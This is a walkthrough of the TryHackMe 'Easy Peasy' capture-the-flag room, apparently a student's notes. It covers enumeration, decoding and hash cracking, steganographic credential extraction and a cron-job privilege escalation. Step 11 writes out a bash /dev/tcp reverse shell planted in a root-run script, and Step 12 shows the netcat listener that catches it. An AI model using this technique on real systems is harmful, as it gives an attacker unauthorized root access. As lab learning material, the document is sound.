# Easy Peasy
link to this room : https://tryhackme.com/room/easypeasyctf

# Walkthrough Notes

## Objective
The goal of this machine was to:
- Discover hidden directories using Nmap and GoBuster
- Gain initial access to the system
- Escalate privileges using a vulnerable cron job

---

## Step 1: Scanning the Target

I started by scanning the target machine using Nmap to identify open ports and running services.

```bash
nmap -sV <target_ip>
```

This scan helped me understand the attack surface and also provided answers for the initial task questions. It revealed important open ports that I used later during enumeration.

---

## Step 2: Directory Enumeration

Next, I used GoBuster to find hidden directories on the web server.

```bash
gobuster dir --url http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt
```

From this scan, I discovered:

- `/hidden`
- `/robots.txt`
- `/index.html`

---

## Step 3: Exploring Hidden Content

I began exploring the discovered paths.

### `/hidden`

- This directory contained a static image.
- The image had German text written on doors, but it did not provide any useful clues.

### `/robots.txt`

- Checked for hidden paths, but it did not reveal anything useful.

---

## Step 4: Deeper Enumeration

Since `/hidden` looked interesting, I performed another GoBuster scan on it.

This led me to:

- `/hidden/whatever`

Inside this directory:

- Found another image

While inspecting the page source, I discovered a Base64 encoded string:

```
ZmxhZ3tmMXJzN19mbDRnfQ==
```

After decoding it, I obtained **Flag 1**.

---

## Step 5: Exploring High Port

During the scan, I noticed another open port: `65524`.

When I accessed it:

- It showed the default Apache web page
- The page contained an encoded flag

Looking at the page source, I found a hint about the encoding method.

I used Base62 decoding, which revealed another hidden directory.

---

## Step 6: Hash Discovery

In the new directory:

- Found another `robots.txt` file
- It contained a hash

To proceed:

- Identified the hash type using an online analyzer
- Cracked it using an MD5 cracking tool

This gave me **Flag 2**.

---

## Step 7: SHA-256 Challenge

I then visited the following path:

```
/n0th1ng3ls3m4tt3r
```

Here, I found:

- A SHA-256 hash

I attempted to crack it using John the Ripper, but it did not work.

---

## Step 8: Steganography Analysis

While examining the page, I noticed a binary image.

### Steps performed:

1. Downloaded the image
2. Used `stegseek` to extract hidden data

```bash
stegseek binarycodepixabay.jpg easypeasy_1596838725703.txt
```

### Results:

- Successfully extracted hidden content
- Found:
    - Username: `boring`
    - Password in binary format

I converted the binary into a readable string to get the password.

---

## Step 9: SSH Access

Using the extracted credentials, I connected to the system via SSH:

```bash
ssh -p 6498 boring@<target_ip>
```

### Inside the system:

- Found a file named `user.txt`
- The content was encoded using ROT13

After decoding it, I obtained the **user flag**.

---

## Step 10: Privilege Escalation

The hint suggested looking into cron jobs.

I checked the cron configuration:

```bash
cat /etc/crontab
```

### Found:

- A cron job running as root
- It was executing a script located at:

```
/var/www/.mysecretcronjob.sh
```

---

## Step 11: Exploiting the Cron Job

I navigated to the script location:

```bash
cd /var/www
ls -la
```

Found the script `.mysecretcronjob.sh`.

I modified it to include a reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<your_ip>/7777 0>&1
```

---

## Step 12: Gaining Root Shell

On my local machine, I started a listener:

```bash
nc -lvnp 7777
```

After the cron job executed, I received a reverse shell with root privileges.

---

## Step 13: Capture Root Flag

Finally, I listed the directory and read the root flag:

```bash
ls -la
cat root.txt
```

- Successfully retrieved the **root flag**
- Machine completed

---

## Summary

- Performed reconnaissance using Nmap
- Discovered hidden directories using GoBuster
- Decoded multiple encoding formats (Base64, Base62, ROT13)
- Cracked an MD5 hash
- Used steganography tools to extract hidden credentials
- Exploited a cron job for privilege escalation
- Gained full root access via reverse shell

```

```
